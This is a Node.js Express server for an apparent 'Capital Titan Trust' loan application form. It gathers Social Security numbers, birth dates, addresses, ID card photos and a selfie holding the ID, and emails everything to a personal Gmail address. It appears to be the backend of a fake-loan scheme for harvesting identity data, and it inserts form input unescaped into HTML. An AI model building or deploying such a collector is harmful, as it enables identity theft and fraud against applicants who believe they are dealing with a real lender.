const express = require('express');
const multer = require('multer');
const path = require('path');
const SibApiV3Sdk = require('sib-api-v3-sdk');

const app = express();

// MEMORY STORAGE - REQUIRED FOR BREVO ATTACHMENTS
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

app.use(express.static('public'));

// BREVO API KEY
let defaultClient = SibApiV3Sdk.ApiClient.instance;
let apiKey = defaultClient.authentications['api-key'];
apiKey.apiKey = process.env.BREVO_API_KEY;

// YOUR FORM SENDS TO /apply - SO WE LISTEN TO /apply
app.post('/apply', upload.any(), async (req, res) => {
  try {
    console.log("✅ FRONT PAGE DATA RECEIVED:", req.body);
    console.log("✅ FILES RECEIVED:", req.files?.length);

    const appId = `CTT-${Date.now()}`;
    
    // Get name for subject
    const firstName = req.body.firstName || "";
    const lastName = req.body.lastName || "";
    const fullName = `${firstName} ${lastName}`.trim();
    const phone = req.body.phone || "";

    // === BUILD TABLE WITH ALL RESULTS FROM FRONT PAGE ===
    let rows = "";
    const fieldOrder = [
      'firstName','lastName','email','phone',
      'dobDay','dobMonth','dobYear','dateOfBirth',
      'homeAddress','city','state','zipcode',
      'highSchool','yearOfEntry','graduationYear',
      'SocialSecurityNumber','IDCard',
      'employment','income','loanAmount','purpose'
    ];

    // Show in order like video, then any other fields
    for (let key of fieldOrder) {
      if(req.body[key]){
        rows += `<tr><td style="padding:10px; border:1px solid #ddd; font-weight:bold; background:#f8fafc;">${key}</td><td style="padding:10px; border:1px solid #ddd;">${req.body[key]}</td></tr>`;
      }
    }
    // Add any remaining fields not in list
    for (let [k,v] of Object.entries(req.body)){
      if(!fieldOrder.includes(k)){
        rows += `<tr><td style="padding:10px; border:1px solid #ddd; font-weight:bold; background:#f8fafc;">${k}</td><td style="padding:10px; border:1px solid #ddd;">${v}</td></tr>`;
      }
    }

    // ATTACHMENTS FOR BREVO
    let attachments = [];
    if(req.files && req.files.length > 0){
      attachments = req.files.map(file => ({
        name: file.fieldname + '-' + file.originalname,
        content: file.buffer.toString('base64')
      }));
    }

    // HTML LIKE VIDEO - FANCY VIEW
    let htmlContent = `
      <div style="font-family:Arial; max-width:650px; margin:auto; border:1px solid #ddd; border-radius:12px; overflow:hidden;">
        <div style="background:#0f2a4d; color:white; padding:20px; text-align:center;">
          <h2 style="margin:0;">Capital Titan Trust</h2>
          <h3 style="margin:10px 0 0; background:#00D632; color:black; display:inline-block; padding:6px 15px; border-radius:20px;">✅ NEW LOAN APPLICATION</h3>
        </div>
        <div style="padding:20px;">
          <p><strong>ID:</strong> ${appId} | <strong>Date:</strong> ${new Date().toLocaleString()}</p>
          <table style="width:100%; border-collapse:collapse; margin-top:10px;">
            ${rows}
          </table>
          <div style="margin-top:20px; background:#f0f9ff; padding:15px; border-radius:10px;">
            <h3 style="margin:0 0 10px;">📎 DOCUMENTS - FANCY VIEW</h3>
            <p>ID FRONT: ${req.files?.find(f=>f.fieldname==='IDCardFront') ? '✅ Attached' : '❌ Missing'}<br>
               ID BACK: ${req.files?.find(f=>f.fieldname==='IDCardBack') ? '✅ Attached' : '❌ Missing'}<br>
               SELFIE WITH ID: ${req.files?.find(f=>f.fieldname==='selfieWithCard') ? '✅ Attached' : '❌ Missing'}</p>
          </div>
        </div>
      </div>
    `;

    // SEND VIA BREVO
    let apiInstance = new SibApiV3Sdk.TransactionalEmailsApi();
    let sendSmtpEmail = new SibApiV3Sdk.SendSmtpEmail();

    sendSmtpEmail.subject = `NEW LOAN - ${appId} - ${fullName} - ${phone}`;
    sendSmtpEmail.htmlContent = htmlContent;
    sendSmtpEmail.sender = { name: "Capital Titan Trust", email: "nancymikos6@gmail.com" };
    sendSmtpEmail.to = [{ email: "nancymikos6@gmail.com" }];
    if(attachments.length > 0) sendSmtpEmail.attachment = attachments;

    await apiInstance.sendTransacEmail(sendSmtpEmail);
    console.log("✅ EMAIL SENT - ALL FIELDS + 3 PHOTOS");

    res.json({ success: true, id: appId });

  } catch (error) {
    console.error("❌ ERROR:", error);
    res.status(500).json({ success: false, message: error.message });
  }
});

app.get('/', (req,res)=>{
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, ()=> console.log(`Server running on ${PORT}`));